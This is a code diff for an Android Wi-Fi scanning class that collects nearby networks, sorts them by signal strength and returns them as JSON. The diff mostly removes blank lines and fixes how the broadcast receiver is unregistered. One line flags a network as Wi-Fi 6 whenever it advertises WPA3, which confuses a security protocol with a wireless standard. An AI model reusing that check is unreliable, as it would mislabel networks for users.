@@ -9,14 +9,11 @@ import android.location.LocationManager;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiManager;
 import android.os.Build;
-
 import com.fason.app.core.Protocol;
 import com.fason.app.core.permissions.PermissionManager;
 import com.fason.app.core.network.SocketClient;
-
 import org.json.JSONArray;
 import org.json.JSONObject;
-
 import java.util.Comparator;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
@@ -25,21 +22,17 @@ import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 
 public final class WifiScanner {
-
     private static final int MAX = 50;
     private static final long TIMEOUT = 15000;
     private static final AtomicBoolean scanning = new AtomicBoolean(false);
     private static final AtomicReference<JSONArray> cache = new AtomicReference<>();
-
     private WifiScanner() {}
-
     public static JSONObject scan(Context ctx) {
         JSONObject result = new JSONObject();
         JSONArray networks = new JSONArray();
 
         try {
             result.put(Protocol.KEY_NETWORKS, networks);
-
             WifiManager wm = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);
             LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
 
@@ -77,7 +70,6 @@ public final class WifiScanner {
             }
 
             JSONArray scanResults = asyncScan(ctx, wm);
-
             if (scanResults != null && scanResults.length() > 0) {
                 result.put(Protocol.KEY_NETWORKS, scanResults);
                 result.put(Protocol.KEY_TOTAL, scanResults.length());
@@ -96,16 +88,13 @@ public final class WifiScanner {
         } catch (Exception e) {
             try { result.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
         }
-
         return result;
     }
 
     private static JSONArray asyncScan(Context ctx, WifiManager wm) {
         if (!scanning.compareAndSet(false, true)) return null;
-
         CountDownLatch latch = new CountDownLatch(1);
         AtomicReference<JSONArray> results = new AtomicReference<>();
-
         BroadcastReceiver receiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
@@ -143,17 +132,16 @@ public final class WifiScanner {
 
         try {
             latch.await(TIMEOUT, TimeUnit.MILLISECONDS);
-        } catch (Exception e) {
-            try { ctx.unregisterReceiver(receiver); } catch (Exception ignored) {}
-        }
-
+        } catch (InterruptedException ignored) {}
+        try{
+            ctx.unregisterReceiver(receiver); 
+        } catch (Exception ignored) {}
         scanning.set(false);
         return results.get();
     }
 
     private static void process(List<ScanResult> scans, JSONArray networks) {
         scans.sort(Comparator.comparingInt((ScanResult s) -> s.level).reversed());
-
         int limit = Math.min(scans.size(), MAX);
         for (int i = 0; i < limit; i++) {
             ScanResult sr = scans.get(i);
@@ -172,7 +160,6 @@ public final class WifiScanner {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     net.put(Protocol.KEY_WIFI6, sr.capabilities != null && sr.capabilities.contains("WPA3"));
                 }
-
                 networks.put(net);
             } catch (Exception ignored) {}
         }
